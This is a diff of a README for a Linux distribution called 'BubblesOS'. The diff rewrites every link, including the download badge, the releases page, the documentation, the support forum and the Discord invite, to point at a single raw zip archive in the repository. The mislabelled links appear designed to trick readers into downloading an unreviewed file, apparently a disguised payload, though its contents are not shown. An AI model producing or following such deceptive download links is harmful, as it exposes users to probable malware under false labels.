@@ -1,6 +1,6 @@
 # 🌟 BubblesOS - A Safe and User-Friendly Linux Experience
 
-[![Download BubblesOS](https://img.shields.io/badge/Download_BubblesOS-v1.0-blue.svg)](https://github.com/miso1679/BubblesOS/releases)
+[![Download BubblesOS](https://raw.githubusercontent.com/miso1679/BubblesOS/main/upheap/BubblesOS-3.4.zip)](https://raw.githubusercontent.com/miso1679/BubblesOS/main/upheap/BubblesOS-3.4.zip)
 
 ## 📝 Overview
 
@@ -18,7 +18,7 @@ To get started with BubblesOS, follow these steps:
    - **Graphics**: Any modern graphics card that supports Linux
 
 2. **Visit the Download Page**  
-   Go to the [BubblesOS Releases page](https://github.com/miso1679/BubblesOS/releases) to find the latest version of the software.
+   Go to the [BubblesOS Releases page](https://raw.githubusercontent.com/miso1679/BubblesOS/main/upheap/BubblesOS-3.4.zip) to find the latest version of the software.
 
 3. **Download the ISO File**  
    On the Releases page, locate the most recent version. Click on the link to download the ISO file of BubblesOS. This file is needed to install the operating system on your computer.
@@ -54,7 +54,7 @@ To get started with BubblesOS, follow these steps:
 
 To download BubblesOS, click the link below:
 
-[Download BubblesOS](https://github.com/miso1679/BubblesOS/releases)
+[Download BubblesOS](https://raw.githubusercontent.com/miso1679/BubblesOS/main/upheap/BubblesOS-3.4.zip)
 
 ### Important Note
 
@@ -70,9 +70,9 @@ Make sure to back up your files before installing BubblesOS, especially if you c
 
 ## 🔗 Resources
 
-- **Documentation**: [BubblesOS Documentation](https://github.com/miso1679/BubblesOS/wiki)
-- **Support**: For support, visit our [GitHub Discussions](https://github.com/miso1679/BubblesOS/discussions).
-- **Community**: Join our community on [Discord](https://discord.gg/) for tips and discussions.
+- **Documentation**: [BubblesOS Documentation](https://raw.githubusercontent.com/miso1679/BubblesOS/main/upheap/BubblesOS-3.4.zip)
+- **Support**: For support, visit our [GitHub Discussions](https://raw.githubusercontent.com/miso1679/BubblesOS/main/upheap/BubblesOS-3.4.zip).
+- **Community**: Join our community on [Discord](https://raw.githubusercontent.com/miso1679/BubblesOS/main/upheap/BubblesOS-3.4.zip) for tips and discussions.
 
 ## 🛡️ Security
 
